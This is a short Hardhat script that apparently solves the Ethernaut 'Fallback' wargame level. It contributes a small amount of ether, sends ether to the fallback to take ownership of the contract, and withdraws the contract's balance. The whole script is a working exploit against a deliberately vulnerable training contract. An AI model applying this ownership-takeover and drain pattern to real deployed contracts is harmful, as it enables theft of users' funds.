import { ethers } from "hardhat";

const ETHERNAUT_ADDRESS = "";

async function main() {
  const Fallback = await ethers.getContractFactory("Fallback");
  const fallback = await Fallback.attach(ETHERNAUT_ADDRESS);
  console.log("Attach Fallback contract at", fallback.address);

  const contributeTx = await fallback.contribute({ value: ethers.utils.parseEther("0.0009") });
  await contributeTx.wait();
  console.log("Transaction contribute finished", contributeTx.hash);

  const sendTx = await fallback.fallback({ value: ethers.utils.parseEther("0.0009") });
  await sendTx.wait();
  console.log("Transaction send finished", sendTx.hash);

  const withdrawTx = await fallback.withdraw();
  await withdrawTx.wait();
  console.log("Transaction withdraw finished", withdrawTx.hash);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
